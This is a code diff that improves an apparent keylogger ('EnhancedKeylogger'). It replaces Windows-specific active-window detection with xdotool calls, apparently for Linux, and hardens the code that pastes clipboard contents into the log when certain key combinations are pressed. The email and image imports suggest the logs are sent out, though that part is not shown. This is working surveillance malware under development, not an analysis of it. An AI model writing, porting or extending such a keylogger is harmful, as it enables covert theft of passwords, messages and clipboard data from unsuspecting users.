@@ -23,11 +23,8 @@ import requests
 import hashlib
 import pyautogui
 import clipboard
-import shutil
 import sys
-import subprocess
 import time
-import pygetwindow as gw
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
@@ -109,8 +106,10 @@ class EnhancedKeylogger:
 
     def get_active_window_title(self):
         try:
-            window = gw.getActiveWindow()
-            return window.title if window else "Unknown Window"
+            import subprocess
+            win_id = subprocess.check_output(["xdotool", "getactivewindow"]).strip()
+            window_name = subprocess.check_output(["xdotool", "getwindowname", win_id]).strip()
+            return window_name.decode("utf-8")
         except Exception:
             return "Window Fetch Failed"
 
@@ -121,7 +120,10 @@ class EnhancedKeylogger:
                 self.current_key_list.add(key)
                 if any(all(k in self.current_key_list for k in combo) for combo in self.COMBINATIONS):
                     current_key += "\n[CLIPBOARD START]\n"
-                    current_key += clipboard.paste()
+                    try:
+                        current_key += clipboard.paste()
+                    except Exception:
+                        current_key += "[Clipboard Read Failed]"
                     current_key += "\n[CLIPBOARD END]\n"
             if key == keyboard.Key.enter:
                 current_key += "\n"
@@ -222,7 +224,6 @@ class EnhancedKeylogger:
             logging.error(f"Runtime error: {e}")
         finally:
             logging.info("Keylogger session ended")
-
 
 if __name__ == "__main__":
     print("""
